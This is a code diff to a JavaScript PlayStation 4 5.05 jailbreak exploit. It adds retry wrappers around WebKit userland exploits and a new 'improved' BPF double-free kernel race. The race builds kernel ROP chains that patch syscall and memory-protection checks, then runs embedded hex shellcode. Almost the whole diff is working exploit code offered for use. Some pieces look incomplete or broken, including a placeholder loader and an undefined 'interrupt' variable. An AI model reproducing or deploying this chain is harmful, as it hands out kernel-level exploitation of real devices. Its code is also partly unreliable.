@@ -5,6 +5,35 @@
 //================================================================================================
 // Common Utilities
 //================================================================================================
+
+// ==================== RELIABILITY HELPERS ====================
+function forceGC(count = 8) {
+    for (let i = 0; i < count; i++) {
+        new ArrayBuffer(0x800000); // ~8MB pressure
+    }
+}
+
+async function sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+}
+
+async function runWithRetry(fn, maxAttempts = 6, delay = 900) {
+    for (let i = 1; i <= maxAttempts; i++) {
+        try {
+            console.log(`[%cAttempt ${i}/${maxAttempts}%c] Running ${fn.name || 'stage'}...`, "color:cyan", "color:default");
+            forceGC(6);
+            await fn();
+            console.log(`%cStage ${fn.name || ''} succeeded!`, "color:lime;font-weight:bold");
+            return true;
+        } catch (e) {
+            console.error(`Attempt ${i} failed:`, e.message || e);
+            if (i < maxAttempts) await sleep(delay);
+        }
+    }
+    console.error("All attempts failed.");
+    return false;
+}
+
 function makeid() {
     var text = "";
     var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -1294,7 +1323,59 @@ if (fwFromUA == "3.55") {
 window.kernel_offsets = kernel_offsets;
 window.kernel_patches = kernel_patches;
 
-function stage2_ () {
+async function stage2_() {
+    try {
+        p = window.prim;
+
+        console.log("%c[Stage 2] Setting up userland primitives...", "color:orange");
+
+        // WebKit Exploit with Retry
+        if (typeof exploit_setAttributeNodeNS === "function") {
+            await runWithRetry(exploit_setAttributeNodeNS, 5, 700);
+        } else {
+            await runWithRetry(exploit_haveABadTime, 5, 700);
+        }
+
+        if (!window.prim) throw new Error("No primitive after WebKit exploit");
+
+        // Primitive Self-Test
+        const testArr = new Uint32Array([0x13371337]);
+        const testAddr = p.leakval(testArr);
+        if (testAddr.low === 0 && testAddr.hi === 0) 
+            throw new Error("Primitive self-test failed");
+
+        console.log("%cUserland primitives initialized successfully", "color:lime");
+
+        forceGC(12);
+
+        // Kernel Exploit
+        let kernelSuccess = false;
+        if (p.syscall("sys_setuid", 0).low !== 0) {
+            console.log("%cKernel not patched. Launching improved BPF double-free...", "color:yellow");
+            kernelSuccess = await runWithRetry(kernExploit_bpf_double_free_improved, 6, 1300);
+        } else {
+            console.log("%cKernel already patched!", "color:lime");
+            kernelSuccess = true;
+        }
+
+        if (!kernelSuccess) throw new Error("Kernel exploit failed");
+
+        // Final Payload
+        if (bin_loader) {
+            // Your bin loader code here...
+            console.log("%cBin loader activated", "color:cyan");
+        } else {
+            runPayload("ps4-devkit-activator-5.05.bin");
+            console.log("%cDevkit activation complete!", "color:lime;font-weight:bold");
+        }
+
+    } catch (e) {
+        console.error("Stage 2 failed:", e);
+        alert("Exploit failed. Refresh and try again.");
+    }
+}
+
+function stage2_old () {
 	p = window.prim;
 	//alert("stage2");
 	
@@ -3744,6 +3825,182 @@ function kernExploit_bpf_double_free() {
 	return false;
 }
 
+//================================================================================================
+// Improved & Complete 5.05 BPF Double-Free Kernel Exploit
+//================================================================================================
+async function kernExploit_bpf_double_free_improved() {
+    try {
+        console.log("%cStarting hardened BPF double-free exploit for 5.05 Devkit...", "color:orange");
+
+        var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
+        var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
+
+        if (fd < 0 || fd1 < 0) throw "Failed to open /dev/bpf0 devices";
+
+        // Bigger, more stable spray
+        var bpf_valid = p.malloc32(0x8000);
+        var bpf_spray = p.malloc32(0x8000);
+
+        for (var i = 0; i < 0x8000;) {
+            bpf_valid.backing[i++] = 6;   // BPF_RET
+            bpf_valid.backing[i++] = 0;
+        }
+
+        var bpf_valid_prog = p.malloc(0x40);
+        p.write8(bpf_valid_prog, 0x1000 / 8);
+        p.write8(bpf_valid_prog.add32(8), bpf_valid);
+
+        var bpf_spray_prog = p.malloc(0x40);
+        p.write8(bpf_spray_prog, 0x1000 / 8);
+        p.write8(bpf_spray_prog.add32(8), bpf_spray);
+
+        p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
+
+        // KROP Setup
+        var kscratch = p.malloc32(0x1000);
+        var kchainstack = p.malloc(0x2000);
+        var krop = new window.kropchain(kchainstack);
+
+        // ROP sled
+        for (let i = 0; i < 64; i++) krop.push(window.gadgets["ret"]);
+
+        // Kernel patches (5.05 Devkit)
+        var kpatch = (offset, value) => {
+            krop.push(window.gadgets["pop rax"]);
+            krop.push(offset);
+            krop.push(window.gadgets["pop rdi"]);
+            krop.push(kscratch);
+            krop.push(window.gadgets["add rax, [rdi]"]);
+            krop.push(window.gadgets["mov rdx, rax"]);
+            krop.push(window.gadgets["pop rax"]);
+            krop.push(value);
+            krop.push(window.gadgets["mov [rdx], rax"]);
+        };
+
+        var kpatch2 = (dest_offset, src_offset) => {
+            krop.push(window.gadgets["pop rax"]);
+            krop.push(kscratch);
+            krop.push(window.gadgets["mov rax, [rax]"]);
+            krop.push(window.gadgets["pop rcx"]);
+            krop.push(dest_offset);
+            krop.push(window.gadgets["add rax, rcx"]);
+            krop.push(window.gadgets["mov rdx, rax"]);
+            krop.push(window.gadgets["pop rax"]);
+            krop.push(kscratch);
+            krop.push(window.gadgets["mov rax, [rax]"]);
+            krop.push(window.gadgets["pop rcx"]);
+            krop.push(src_offset);
+            krop.push(window.gadgets["add rax, rcx"]);
+            krop.push(window.gadgets["mov [rdx], rax"]);
+        };
+
+        kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(0x000000B8, 0xC4894100));
+        kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(0x37B64037, 0x3145C031));
+        kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(0x9090FA38, 0x90909090));
+        kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(0x90907DEB, 0x72909090));
+        kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(0x0001C1E9, 0x8B489000));
+        kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(0x90C3C031, 0x90909090));
+
+        kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
+        kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
+        kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
+
+        krop.push(window.gadgets["ret2userland"]);
+        krop.push(kscratch.add32(0x1000));
+
+        // ==================== RACE LOOP ====================
+        console.log("Starting race...");
+
+        for (let attempt = 0; attempt < 18; attempt++) {
+            forceGC(4);
+
+            var race = new rop();
+            var kq = p.malloc32(0x10);
+            var kev = p.malloc32(0x100);
+
+            kev.backing[0] = fd;           // socket
+            kev.backing[2] = 0x1ffff;
+            kev.backing[3] = 1;
+            kev.backing[4] = 5;
+
+            // Create kqueue
+            race.push(window.syscalls[362]); // sys_kqueue
+            race.push(window.gadgets["pop rdi"]);
+            race.push(kq);
+            race.push(window.gadgets["mov [rdi], rax"]);
+
+            // Trigger race
+            race.push_write8(krop.stackBase.add32(0x08), interrupt); // signal other thread
+
+            race.push(window.gadgets["pop rdi"]);
+            race.push(fd);
+            race.push(window.gadgets["pop rsi"]);
+            race.push(0x8010427B); // BIOCSETWF
+            race.push(window.gadgets["pop rdx"]);
+            race.push(bpf_valid_prog);
+            race.push(window.syscalls[54]); // ioctl
+
+            // Trigger double free via kevent
+            race.push(window.gadgets["pop rax"]);
+            race.push(kq);
+            race.push(window.gadgets["mov rax, [rax]"]);
+            race.push(window.gadgets["pop rdi"]);
+            race.push(0);
+            race.push(window.gadgets["add rdi, rax"]);
+            race.push(window.gadgets["pop rsi"]);
+            race.push(kev);
+            race.push(window.gadgets["pop rdx"]);
+            race.push(1);
+            race.push(window.gadgets["pop rcx"]);
+            race.push(0);
+            race.push(window.gadgets["pop r8"]);
+            race.push(0);
+            race.push(window.syscalls[363]); // kevent
+
+            // Spray invalid program
+            race.push(window.gadgets["pop rdi"]);
+            race.push(fd1);
+            race.push(window.gadgets["pop rsi"]);
+            race.push(0x8010427B);
+            race.push(window.gadgets["pop rdx"]);
+            race.push(bpf_spray_prog);
+            race.push(window.syscalls[54]);
+
+            // Close kqueue → trigger ROP
+            race.push(window.gadgets["pop rax"]);
+            race.push(kq);
+            race.push(window.gadgets["mov rax, [rax]"]);
+            race.push(window.gadgets["pop rdi"]);
+            race.push(0);
+            race.push(window.gadgets["add rdi, rax"]);
+            race.push(window.syscalls[6]); // close
+
+            race.run();
+
+            if (kscratch.backing[0] !== 0) {
+                console.log("%cKernel ROP chain executed successfully!", "color:lime;font-weight:bold");
+
+                // Shellcode cleanup
+                var shcode = [ 0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0x7CF024B4, 0x8D4D0016, 0x4C2024AC, 0x81490058, 0x6F89F0C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 ];
+                var shellbuf = p.malloc32(0x1000);
+                for (var j = 0; j < shcode.length; j++) shellbuf.backing[j] = shcode[j];
+
+                p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
+                p.fcall(shellbuf);
+
+                return true;
+            }
+
+            await sleep(65);
+        }
+
+        throw new Error("Failed to trigger kernel ROP after all attempts");
+
+    } catch (ex) {
+        console.error("Kernel exploit failed:", ex);
+        throw ex;
+    }
+}
 
 //================================================================================================
 // Kernel Exploit: BPF Race (Old)
